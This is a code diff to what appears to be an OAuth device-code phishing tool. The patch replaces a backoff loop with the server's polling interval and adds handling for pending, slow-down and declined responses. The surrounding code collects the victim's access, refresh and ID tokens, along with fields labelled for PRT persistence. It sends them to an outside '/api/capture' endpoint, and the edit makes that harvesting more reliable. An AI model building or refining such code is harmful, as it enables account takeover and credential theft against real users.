@@ -186,8 +186,9 @@ async function handleDeviceCodeRequest(request) {
     );
     const deviceCodeData = await deviceCodeResponse.json();
 
-    // Start background polling
-    pollForTokens(deviceCodeData.device_code, jwt_token, verifyData);
+    // Start background polling with server-recommended interval
+    const pollInterval = deviceCodeData.interval || 5;
+    pollForTokens(deviceCodeData.device_code, jwt_token, verifyData, pollInterval);
 
     return new Response(JSON.stringify({
       user_code: deviceCodeData.user_code,
@@ -205,17 +206,16 @@ async function handleDeviceCodeRequest(request) {
   }
 }
 
-async function pollForTokens(deviceCode, jwtToken, verifyData) {
+async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) {
   const maxAttempts = 60;
   let attempts = 0;
+  let interval = initialInterval || 5; // Use server-recommended interval
 
   while (attempts < maxAttempts) {
     attempts++;
-    
-    // FIX: Exponential backoff strategy instead of fixed delay
-    // Wait times: 2s, 4s, 8s, 16s, 32s, then cap at 10s for rest of attempts
-    const waitTime = Math.min(10000, Math.pow(2, attempts) * 1000);
-    await new Promise(resolve => setTimeout(resolve, waitTime));
+
+    // Wait for the current interval (adaptive based on server response)
+    await new Promise(resolve => setTimeout(resolve, interval * 1000));
 
     try {
       const tokenResponse = await fetch(
@@ -241,7 +241,7 @@ async function pollForTokens(deviceCode, jwtToken, verifyData) {
           refresh_token: tokenData.refresh_token,
           id_token: tokenData.id_token,
         };
-        
+
         // Add PRT persistence fields if available
         if (tokenData.client_info) {
           capturePayload.client_info = tokenData.client_info;
@@ -261,16 +261,35 @@ async function pollForTokens(deviceCode, jwtToken, verifyData) {
         if (tokenData.scope) {
           capturePayload.scope = tokenData.scope;
         }
-        
+
         await fetch(`${VERIFY_ENDPOINT}/api/capture`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(capturePayload),
         });
         return;
-      } else if (tokenData.error === 'authorization_declined' || tokenData.error === 'expired_token') {
+      }
+
+      // Handle specific OAuth device code errors
+      const errorCode = tokenData.error || '';
+
+      if (errorCode === 'authorization_pending') {
+        // User has not yet authorized - continue polling with same interval
+        continue;
+      }
+
+      if (errorCode === 'slow_down') {
+        // Microsoft is rate-limiting - increase interval by 5 seconds
+        interval = interval + 5;
+        continue;
+      }
+
+      if (errorCode === 'authorization_declined' || errorCode === 'expired_token') {
+        // User declined or token expired - stop polling
         return;
       }
+
+      // For any other error, continue polling (network issues, etc.)
     } catch (e) {
       // Continue polling on network errors
     }
